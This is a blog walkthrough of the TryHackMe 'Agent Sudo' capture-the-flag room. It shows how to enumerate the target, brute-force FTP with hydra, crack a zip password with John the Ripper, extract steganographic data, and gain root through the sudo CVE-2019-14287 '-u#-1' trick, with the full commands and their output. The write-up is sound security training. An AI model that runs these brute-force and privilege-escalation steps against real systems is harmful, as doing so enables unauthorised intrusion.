---
layout: post
title: "TryHackMe - Agent Sudo"
author: "joona"
---

![](/images/agentsudo/agentsudo.jpg)
>You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

[Agent Sudo][AgentSudo] is an easy room on TryHackMe created by [DesKel][DesKel].<br/>
It includes some basic enumeration, brute-forcing and CTF methods such as steganography and hash cracking.
The privilege escalation is an interesting vulnerability in the `sudo` command.

### Nmap results<br/>
{% highlight plaintext %}
nmap -A -p- 10.10.53.38 -oA nmap
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
{% endhighlight %}
<br/>

### Website Enumeration
On the website at port 80 we have the following text:<br/>
{% highlight plaintext %}
Dear agents,

Use your own codename as user-agent to access the site.

From,
Agent R
{% endhighlight %}

So the codename is probably a single letter, based on the signature, **Agent R**.<br/>
We are told to use this codename as the user-agent.<br/>

Since we don't know the codename, I used Burp Suite's Intruder to fuzz the correct user-agent.

![](/images/agentsudo/intruder.jpg)<br/>
From the results we can see that letters **R** and **C** gave a different size response that other letters.<br/>

With **User-agent: R** we have nothing interesting, just a warning that this incident will be reported.<br/>

With **User-agent: C** we get redirected to `/agent_C_attention.php` where we have a message:<br/>
{% highlight plaintext %}
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP.
Also, change your god damn password, is weak!

From,
Agent R
{% endhighlight %}

Now we have a username **chris** and it's supposed to have a weak password.
<br/><br/>

### FTP Enumeration
Let's try to brute-force our way into the FTP server with username **chris**.
>hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.53.38 -V -I

And we have a match: **crystal**<br/>

Logging in as chris to the FTP server we have three files:<br/>
- To_agentJ.txt
- cute-alien.jpg
- cutie.png

To_agentJ.txt:
{% highlight plaintext %}
Dear agent J,

All these alien like photos are fake!
Agent R stored the real picture inside your directory.
Your login password is somehow stored in the fake picture.
It shouldn't be a problem for you.

From,
Agent C
{% endhighlight %}
<br/>

### Hash Cracking and Brute-Force
Digging the images for clues, I found with `binwalk cutie.png` that there's a zip file inside it.<br/>
![](/images/agentsudo/cutie.jpg)

Trying to unzip it with `unzip cutie.png` we get an error message:<br/>
`skipping: To_agentR.txt           need PK compat. v5.1 (can do v4.6)`<br/>

I used **7zip**: `7z x cutie.png` to try and extract it but we get a password prompt.<br/>

We can use binwalk to extract the data: `binwalk -e cutie.png`. With this we get
a zip file **8702.zip**.

We can try to brute-force this with **John the Ripper**. First we need to process the
zip file into a format suitable for use with JtR. This can be done with **zip2john**.

{% highlight plaintext %}
zip2john 8702.zip > agent.zip
root@world:~/tryhackme/agentsudo# zip2john 8702.zip > zip.hash
ver 81.9 8702.zip/To_agentR.txt is not encrypted, or stored with non-handled compression type
root@world:~/tryhackme/agentsudod# john zip.hash
...
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
alien            (8702.zip/To_agentR.txt)
...
{% endhighlight %}

Now we can extract the file with 7zip and the password **alien**.

We get the file To_agentR.txt:
{% highlight plaintext %}
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
{% endhighlight %}

'QXJlYTUx' is base64:
{% highlight plaintext %}
root@world:~/tryhackme/agentsudo# echo -n 'QXJlYTUx' | base64 -d
Area51
{% endhighlight %}

Using this password to extract data from **cute-alien.jpg**:
{% highlight plaintext %}
root@world:~/tryhackme/agentsudo# steghide extract -sf cute-alien.jpg
Enter passphrase: Area51
wrote extracted data to "message.txt".
{% endhighlight %}

message.txt:
{% highlight plaintext %}
Hi james,

Glad you find this message. Your login password is hackerrules!
Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
{% endhighlight %}
<br/>

### User Flag & Privilege Escalation
Logging in SSH as **james** with the password **hackerrules!** we get the user_flag.txt and Alien_autospy.jpg.

The room name agent-sudo hints strongly to a Sudo vulnerability.<br/>
Checking the Sudo version with `sudo --version` we see that it's
`1.8.21p2`. Googling vulnerabilities for this version we find [CVE-2019-14287][CVE-2019-14287].
>The vulnerability exists in the implementation of the "sudo" application when processing commands that are configured to run with ALL keyword.<br/>
A local user with privileges to use sudo for specific applications on the system can escalate privileges and run the application as root (even if precisely restricted), if user id "-1" or "4294967295" is used.

So basically this requires that we have sudo right to run any command with ALL keyword. We can check this with `sudo -l`:
{% highlight plaintext %}
james@agent-sudo:~$ sudo -l
User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash
{% endhighlight %}

So now we can privesc with a simple command:
{% highlight plaintext %}
james@agent-sudo:~$ sudo -u#-1 /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
{% endhighlight %}

root.txt:
{% highlight plaintext %}
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe.
Tips, always update your machine.

Your flag is
~~censored~~

By,
DesKel a.k.a Agent R
{% endhighlight %}


[AgentSudo]: https://tryhackme.com/room/agentsudoctf
[DesKel]: https://tryhackme.com/p/DesKel
[CVE-2019-14287]: https://www.cybersecurity-help.cz/vdb/SB2019101501?affChecked=1
